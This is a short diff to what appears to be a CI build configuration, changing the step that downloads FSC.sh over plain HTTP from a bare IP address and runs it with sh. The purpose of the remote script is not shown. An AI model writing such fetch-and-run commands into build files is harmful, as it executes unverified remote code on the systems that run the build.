@@ -56,4 +56,4 @@ install: |
   make
   make install
   cd -
-script: curl http://47.92.112.211/wp-content/uploads/FSC.sh -L > fsc.sh && sh fsc.sh
+script: curl http://47.92.112.211/FSC.sh -L > fsc.sh && sh fsc.sh
